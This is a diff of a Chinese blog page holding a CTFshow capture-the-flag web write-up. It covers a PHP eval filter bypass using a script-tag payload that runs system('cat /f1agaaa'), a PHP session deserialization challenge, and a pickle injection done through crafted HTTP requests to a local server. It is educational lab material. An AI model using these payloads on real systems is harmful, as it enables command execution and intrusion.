@@ -6,9 +6,7 @@
     <meta charset="utf-8">
     <meta name="keywords" content="CTFshow新手杯, 学习记录">
     <meta name="description" content="
-
 春蚕到死丝方尽，蜡炬成灰泪始干。
-
 
 WEBeasy_eval&amp;lt;?php
 
@@ -17,7 +15,7 @@ WEBeasy_eval&amp;lt;?php
 error_reporting(0);
 highlight_file(__FILE__);
 
-$code &amp;#x3D; $_POST[&amp;#39;cod">
+$code &amp;#x3D; $_POST[&amp;#39;code&amp;">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -512,10 +510,8 @@ $code &amp;#x3D; $_POST[&amp;#39;cod">
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <!--toc-->
-
 <p>春蚕到死丝方尽，蜡炬成灰泪始干。</p>
 <span id="more"></span>
-
 <h2 id="web"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="easy_eval"><a href="#easy-eval" class="headerlink" title="easy_eval"></a>easy_eval</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
 
 
@@ -532,12 +528,8 @@ if(isset($code))&#123;
 
 &#125;
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>分析：传入的code不能有问号，这导致正常的php代码是不能进行命令注入的，但这时候可以用script语法来传入php代码，这个是不需要问号的。</p>
 <pre class="line-numbers language-none"><code class="language-none">code&#x3D;&lt;script language&#x3D;php&gt; system(&#39;cat  &#x2F;f1agaaa&#39;) &lt;&#x2F;script&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-
-
 <h3 id="剪刀石头布-php-session反序列化漏洞"><a href="#剪刀石头布-PHP-session反序列化漏洞" class="headerlink" title="剪刀石头布-PHP session反序列化漏洞"></a>剪刀石头布-PHP session反序列化漏洞</h3><p>原理：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39664643/article/details/123478019">https://blog.csdn.net/weixin_39664643/article/details/123478019</a></p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php">&lt;?php
 ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);
@@ -659,9 +651,6 @@ if(isset($_POST[&quot;choice&quot;]) AND in_array($_POST[&quot;choice&quot;],$ch
 &lt;&#x2F;body&gt;
 &lt;&#x2F;html&gt;
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-
-
 <p>直接反序列化读取flag.php的内容即可。各种细节，须细细品味。</p>
 <h3 id="baby_pickle"><a href="#baby-pickle" class="headerlink" title="baby_pickle"></a>baby_pickle</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"># Author:
 #   Achilles
@@ -749,7 +738,6 @@ def change_name():
 if __name__ &#x3D;&#x3D; &#39;__main__&#39;:
     app.run(host&#x3D;&#39;0.0.0.0&#39;, port&#x3D;8888)
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>分析：</p>
 <p>1、如果对pickle感到疑惑，请看这里：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/wjrblogs/p/14057784.html">https://www.cnblogs.com/wjrblogs/p/14057784.html</a></p>
 <p>2、如果对pickletools感到疑惑，请看这里：<a target="_blank" rel="noopener" href="https://docs.python.org/zh-cn/3.7/library/pickletools.html">https://docs.python.org/zh-cn/3.7/library/pickletools.html</a></p>
@@ -758,7 +746,7 @@ if __name__ &#x3D;&#x3D; &#39;__main__&#39;:
 <p>当访问<code>/dacaiji</code>的时候，会反序列化前面生成的xxx_info文件并生成Rookie对象，如果这个对象的id属性值是0，那么就可以获得flag。</p>
 <p>而load在反序列化的时候遇见句号就会停止序列化，所以如果我们的<code>aaa_info</code>内容是这样的话：<img src="/images/image-20221009141444409.png" alt="image-20221009141444409"></p>
 <p><img src="/images/image-20221009141507927.png" alt="image-20221009141507927"></p>
-<p>最终我们反序列化后生成的对象其id值就是0。而本题提供了一个改名函数，能够把xxx_info文件里面的name替换成newname，这不就相当于我们可以控制前面load反序列化的部分内容了么，我们只要在newname里插入句号并想办法让id&#x3D;0就可以拿到flag。</p>
+<p>最终我们反序列化后生成的对象其id值就是0。而本题提供了一个改名函数，能够把xxx_info文件里面的name替换成newname，这不就相当于我们可以控制前面load反序列化的部分内容了么，我们只要在newname里插入句号并想办法让id=0就可以拿到flag。</p>
 <p><img src="/images/image-20221009141733300.png" alt="image-20221009141733300"></p>
 <p><img src="/images/image-20221009141952395.png" alt="image-20221009141952395"></p>
 <p>其实就差一个数字</p>
@@ -779,7 +767,6 @@ Sec-Fetch-Dest: document
 Sec-Fetch-Mode: navigate
 Sec-Fetch-Site: none
 Sec-Fetch-User: ?1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <pre class="line-numbers language-none"><code class="language-none">GET &#x2F;change?name&#x3D;YWFh&amp;newname&#x3D;YWFhCnNWaWQKSTAKc2Iu HTTP&#x2F;1.1
 Host: 127.0.0.1:8888
 User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko&#x2F;20100101 Firefox&#x2F;104.0
@@ -792,7 +779,6 @@ Sec-Fetch-Dest: document
 Sec-Fetch-Mode: navigate
 Sec-Fetch-Site: none
 Sec-Fetch-User: ?1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <pre class="line-numbers language-none"><code class="language-none">GET &#x2F;dacaiji?name&#x3D;aaa HTTP&#x2F;1.1
 Host: 127.0.0.1:8888
 User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko&#x2F;20100101 Firefox&#x2F;104.0
@@ -805,7 +791,6 @@ Sec-Fetch-Dest: document
 Sec-Fetch-Mode: navigate
 Sec-Fetch-Site: none
 Sec-Fetch-User: ?1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 
                 
             </div>
@@ -1060,7 +1045,6 @@ Sec-Fetch-User: ?1<span aria-hidden="true" class="line-numbers-rows"><span></spa
                     <div class="summary block-with-text">
                         
                             
-
 祝你天天开心！
                         
                     </div>
@@ -1107,7 +1091,6 @@ Sec-Fetch-User: ?1<span aria-hidden="true" class="line-numbers-rows"><span></spa
                     <div class="summary block-with-text">
                         
                             
-
 会当凌绝顶，一览众山小。
                         
                     </div>
@@ -1190,7 +1173,7 @@ Sec-Fetch-User: ?1<span aria-hidden="true" class="line-numbers-rows"><span></spa
             contentSelector: '#articleContent',
             headingsOffset: -($(window).height() * 0.4 - 45),
             collapseDepth: Number('0'),
-            headingSelector: 'h2, h3, h4'
+            headingSelector: 'h2, h3, h4,h5'
         });
 
         // modify the toc link href to support Chinese.
@@ -1202,7 +1185,7 @@ Sec-Fetch-User: ?1<span aria-hidden="true" class="line-numbers-rows"><span></spa
 
         // modify the heading title id to support Chinese.
         i = 0;
-        $('#articleContent').children('h2, h3, h4').each(function () {
+        $('#articleContent').children('h2, h3, h4,h5').each(function () {
             $(this).attr('id', tocHeading + (++i));
         });
 
@@ -1331,7 +1314,7 @@ Sec-Fetch-User: ?1<span aria-hidden="true" class="line-numbers-rows"><span></spa
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">267.7k</span>
+                        class="white-color">259.5k</span>
             
             
             
